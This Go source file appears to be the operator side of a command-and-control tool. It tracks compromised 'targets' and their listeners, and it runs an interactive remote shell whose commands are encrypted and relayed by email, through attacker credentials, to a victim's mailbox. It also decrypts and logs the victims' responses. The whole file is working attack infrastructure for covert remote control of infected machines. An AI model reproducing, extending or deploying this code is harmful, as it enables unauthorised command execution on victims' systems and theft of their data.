package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/go-playground/validator"
)

type Target struct {
	Id         string `validate:"required"`
	Ip         string
	SystemInfo string
	User       string
	IdListener string `validate:"required"`
	listener   *Listener
}

type TargetInteractShell struct {
	IsClosed bool
	Id       string
}

var targets = []Target{}

var targetInteractShell = TargetInteractShell{IsClosed: true, Id: ""}

func TargetsInit(db *sql.DB) error {
	query, err := db.Query("SELECT * FROM targets")
	if err != nil {
		return err
	}
	defer query.Close()

	for query.Next() {
		var target Target
		query.Scan(&target.Id, &target.Ip, &target.SystemInfo, &target.User, &target.IdListener)
		for _, listener := range listeners {
			if listener.Id == target.IdListener {
				target.listener = &listener
				break
			}
		}
		targets = append(targets, target)
	}
	return nil
}

func TargetInteract(db *sql.DB, prompt []string) {
	prompt = append(prompt, "target")
	commandOptions := []CommandOption{
		{"ls", "List target", TargetsLs},
		{"shell", "List target", TargetShell},
	}
	menuOptions := NewMenuOptions([]string{"root"}, db)
	menu := NewMenu(commandOptions, menuOptions)
	menu.SetMenuPrompt(prompt)
	menu.Start()
}

func TargetCreate(db *sql.DB, Id, Ip, SystemInfo, User string, listener *Listener) error {
	target := Target{Id: decrypt(Id, listener.Key), Ip: decrypt(Ip, listener.Key), SystemInfo: decrypt(SystemInfo, listener.Key), User: decrypt(User, listener.Key), IdListener: listener.Id, listener: listener}
	validate = validator.New()
	err := validate.Struct(target)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	statement, err := db.Prepare(`INSERT INTO targets(Id, Ip, SystemInfo, User, IdListener) VALUES (?,?,?,?,?)`)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	_, err = statement.Exec(target.Id, target.Ip, target.SystemInfo, target.User, target.IdListener)

	if err != nil {
		fmt.Println(err)
		return nil
	}
	targets = append(targets, target)
	return nil
}

func TargetShell(db *sql.DB, prompt []string, args ...string) error {
	if len(args) != 1 {
		return nil
	}

	var target Target
	for i := range targets {
		if targets[i].Id == args[0] || strconv.Itoa(i) == args[0] {
			target = targets[i]
			break
		}
	}
	logFile, err := os.OpenFile("log/target/"+target.Id+"_shell.txt", os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
	if err != nil {
		log.Fatalln(err)
	}
	CustomLogger := log.New(logFile, "", 0)
	targetInteractShell.IsClosed = false
	targetInteractShell.Id = target.Id
	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print("> ")

		input, _ := consoleReader.ReadString('\n')
		input = strings.Trim(input, " \r\n")
		if input == "" {
			continue
		}
		if input == "exit" || input == "quit" {
			targetInteractShell.IsClosed = true
			return nil
		}
		CustomLogger.Println(">>> " + input)
		input = target.Id + "#" + encrypt(input, target.listener.Key)
		sendMail(target.listener.AttackerUrl, target.listener.Attacker, target.listener.AttackerPassword, strings.Split(target.listener.Victim, "\\")[1]+"@"+target.listener.VictimDomain, "Shell:"+target.IdListener, input)
	}

}

func TargetDelete(db *sql.DB, prompt []string, args ...string) error {
	return nil
}

func TargetParseBody(Id, body, key string) {
	logFile, err := os.OpenFile("log/target/"+Id+"_shell.txt", os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
	if err != nil {
		log.Fatalln(err)
	}
	CustomLogger := log.New(logFile, "", 0)
	data := decrypt(body, key)
	CustomLogger.Println(data)
	if !targetInteractShell.IsClosed && targetInteractShell.Id == Id {
		fmt.Println(data)
	}
}

func TargetSystemInfo(db *sql.DB, prompt []string, args ...string) error {
	return nil
}

func TargetsLs(db *sql.DB, prompt []string, args ...string) error {
	for _, target := range targets {
		fmt.Printf("Target %s:\t%s\t%s\t%s \n", target.Id, target.Ip, target.IdListener, target.User)
	}
	return nil
}
